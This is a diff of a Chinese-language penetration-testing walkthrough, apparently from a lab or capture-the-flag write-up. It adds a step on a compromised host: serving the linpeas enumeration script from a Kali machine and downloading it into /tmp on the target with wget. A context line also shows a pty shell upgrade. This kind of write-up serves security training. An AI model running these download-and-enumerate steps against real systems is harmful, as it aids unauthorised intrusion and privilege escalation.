@@ -80,17 +80,28 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 ### 本地信息收集
 
-* 简单的手动枚举没有什么能利用的，决定上传linpeas进行本地信息收集：
+* 简单的手动枚举没有什么能利用的，决定上传linpeas进行本地信息收集，当前所在的/var/www/目录没有写入权限，所以要切换到/tmp目录下：
 
+```bash
+# 在Kali本机linpeas.sh脚本所在的目录下开启服务器
+python3 -m http.server 8888
+# 在目标系统的/tmp目录下获取脚本文件
+wget http://192.168.45.161:8888/linpeas.sh
+```
 
+<figure><img src="../.gitbook/assets/15 (12).png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../.gitbook/assets/16 (10).png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../.gitbook/assets/17 (8).png" alt=""><figcaption></figcaption></figure>
+
+*
 
 
 
 ### 漏洞利用
 
-
+*
 
 
 
